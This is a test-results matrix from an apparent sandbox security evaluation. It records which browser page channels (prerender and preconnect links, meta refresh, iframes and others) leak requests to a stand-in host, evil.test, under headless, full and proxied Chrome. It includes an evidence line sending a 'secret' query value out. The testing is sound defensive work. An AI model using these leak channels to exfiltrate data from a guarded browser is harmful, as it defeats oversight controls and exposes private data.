# Channel matrix (real worker guard stack, local fixture, 2026-11-02T13:55:12.022Z)

LEAK = something reached the fixture "internet" (HTTP request, WebSocket upgrade, or a TLS handshake whose SNI is a foreign host). "stopped" = nothing reached it. "refused at the proxy" = the allow-list proxy denied the destination BEFORE any DNS lookup/TLS handshake. Chrome's own housekeeping hosts (clients2.google.com, redirector.gvt1.com, accounts.google.com, www.google.com, update.googleapis.com, android.clients.google.com, content-autofill.googleapis.com) are excluded from the page-channel columns.

| channel | headless-shell (Playwright's default binary) | full Chrome, launched directly (provider-style) | full Chrome + allow-list proxy | evidence (full Chrome, no proxy) | refused at the proxy |
|---|---|---|---|---|---|
| <link rel=prerender> (GET with query, any host) | stopped | **LEAK** | stopped | TLS servername=evil.test<br>GET evil.test/prerender-link?d=secret | CONNECT evil.test:443 |
| <link rel=preconnect> (TLS connection to any host) | stopped | **LEAK** | stopped | TLS servername=preconnect-link.evil.test | CONNECT preconnect-link.evil.test:443 |
| <link rel=dns-prefetch> (DNS lookup only) | not observable locally | not observable locally | not observable locally | - | - |
| <link rel=prefetch> | stopped | stopped | stopped | - | - |
| <link rel=preload as=fetch> | stopped | stopped | stopped | - | - |
| <link rel=preload> same origin with query | stopped | stopped | stopped | - | - |
| inline <script type=speculationrules> (prefetch) | stopped | stopped | stopped | - | - |
| speculation rules inserted by a same-origin script | stopped | stopped | stopped | - | - |
| pagehide: sendBeacon / keepalive fetch / Image (evil and same-origin) | stopped | stopped | stopped | - | - |
| Worker / SharedWorker making fetch + WebSocket | stopped | stopped | stopped | - | - |
| WebSocket from the page | stopped | stopped | stopped | - | - |
| WebTransport from the page | stopped | stopped | stopped | - | - |
| fetch / XHR / EventSource from the page | stopped | stopped | stopped | - | - |
| <meta http-equiv=refresh> to a foreign host | stopped | **LEAK** | stopped | TLS servername=evil.test | CONNECT evil.test:443 |
| Refresh: response header to a foreign host | stopped | stopped | stopped | - | - |
| Link: response header (preconnect + prefetch) | stopped | stopped | stopped | - | - |
| script timer navigates to a foreign host | stopped | stopped | stopped | - | - |
| script timer navigates inside the scope with a query | stopped | stopped | stopped | - | - |
| script submits a POST form to a foreign host | stopped | stopped | stopped | - | - |
| <a ping> on the allowed link | stopped | stopped | stopped | - | - |
| script navigates to a hostname that CARRIES data (hex label): DNS/TLS even when the navigation is blocked | stopped | stopped | stopped | - | - |
| link whose server answers 302 to an in-scope URL WITH a query (document hop) | stopped | stopped | stopped | - | - |
| script-created same-origin <a download> with a query, clicked | stopped | stopped | stopped | - | - |
| link whose server answers 302 to a foreign host | stopped | stopped | stopped | - | - |
| link to an attachment / octet-stream response | stopped | stopped | stopped | - | - |
| <iframe>/<object>/<embed> to a foreign host | stopped | **LEAK** | stopped | TLS servername=evil.test | CONNECT evil.test:443 |
| <img>/<script>/<link rel=stylesheet>/CSS @import/url() to a foreign host | stopped | stopped | stopped | - | - |
| dynamic import() with a query | stopped | stopped | stopped | - | - |
| window.open + target=_blank (foreign and same-origin) | stopped | stopped | stopped | - | - |
